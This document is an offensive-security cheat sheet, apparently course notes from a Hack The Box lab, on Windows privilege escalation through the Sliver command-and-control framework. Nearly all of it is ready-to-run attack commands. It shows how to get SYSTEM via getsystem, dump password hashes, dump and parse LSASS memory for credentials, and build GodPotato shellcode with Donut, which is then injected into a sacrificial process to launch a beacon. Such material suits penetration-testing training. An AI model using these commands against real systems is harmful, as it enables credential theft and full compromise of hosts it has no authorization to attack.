# 15.21 Privilege Escalation via Sliver

> Pop SYSTEM via `getsystem` (spoolsv injection), dump LSASS with `procdump --pid`, or GodPotato + Donut for SeImpersonate abuse.

## Overview

`getsystem` injects into spoolsv.exe (default) to obtain SYSTEM. `hashdump` requires SYSTEM context. LSASS dump uses `procdump --pid`. GodPotato exploits SeImpersonatePrivilege via Donut shellcode injected into a sacrificial process via `execute-shellcode`.

## Steps

- Enumerate privileges with `sharpup -- audit`; look for SeImpersonatePrivilege.
- Confirm SeImpersonatePrivilege with SharpUp output, then use GodPotato to escalate.
- `getsystem` requires an Administrator-level session (not just beacon); use `interactive` first.
- Use Donut to convert GodPotato.exe to shellcode; inject via `execute-shellcode -p <notepad-PID>`.
- For LSASS dump: find PID with `ps -e lsass`, dump with `procdump --pid`, parse with pypykatz.
- `hashdump` must be run from NT AUTHORITY\SYSTEM beacon context.

## Commands

### Convert beacon to session for getsystem

```text
sliver (http-beacon-9001) > interactive
```

### getsystem

```text
sliver (http-beacon-9001) > getsystem
```

### hashdump (requires SYSTEM)

```text
sliver (http-beacon-9001) > hashdump
```

### Find LSASS PID

```text
sliver (http-beacon) > ps -e lsass
```

### Dump LSASS

```text
sliver (http-beacon) > procdump --pid 660 --save /tmp/lsass.dmp
```

### Parse LSASS dump

```bash
pypykatz lsa minidump /tmp/lsass.dmp
```

### Donut — create shellcode from GodPotato

```bash
./donut -i /home/htb-ac590/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac590/godpotato.bin
```

### Upload beacon before shellcode injection

```text
sliver (HIGH_RISER) > upload http-beacon.exe
```

### Inject shellcode into sacrificial process

```text
sliver (HIGH_RISER) > execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
```
